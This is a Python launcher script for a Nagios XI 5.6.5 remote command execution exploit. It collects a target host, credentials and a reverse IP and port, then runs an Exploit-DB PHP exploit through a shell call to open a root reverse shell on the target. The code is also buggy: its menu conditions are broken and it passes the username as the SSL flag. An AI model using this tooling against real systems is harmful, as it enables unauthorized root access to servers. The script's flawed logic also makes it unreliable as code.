# Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation

import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


while True:
    host = input(f"{Colors.red}(Nagios XI 5.6.5 Remote Command Execution as root){Colors.end} [Enter Domain]:~#")
    ssl = input(f"{Colors.red}(Nagios XI 5.6.5 Remote Command Execution as root){Colors.end} [SSL (true or false)]:~#")
    user = input(f"{Colors.red}(Nagios XI 5.6.5 Remote Command Execution as root){Colors.end} [Enter Username]:~#")
    passwd = input(f"{Colors.red}(Nagios XI 5.6.5 Remote Command Execution as root){Colors.end} [Enter Password]:~#")
    revip = input(f"{Colors.red}(Nagios XI 5.6.5 Remote Command Execution as root){Colors.end} [Reverse Ip Address]:~#")
    revport = int(input(f"{Colors.red}(Nagios XI 5.6.5 Remote Command Execution as root){Colors.end} [Reverse Port]:~#"))

    if host or ssl or user or passwd or revip or revport == "back" or host or ssl or user or passwd or revip or revport == "exit":
        break
    elif host or ssl or user or passwd or revip or revport == "options":
        print("""
Enter Domain: google.com
Enter SSL (true or false): true
Enter Username: user
Enter Password: pass
Enter Reverse Ip Address 0.0.0.0
Enter Reverse Port: 8000\n\n""")
    else:
        sub.call(f"php /usr/share/exploitdb/exploits/php/webapps/47299.php --host={host} --ssl={user} --user={user} --pass={passwd} --reverseip={revip} --reverseport={revport}",shell=True)
        break
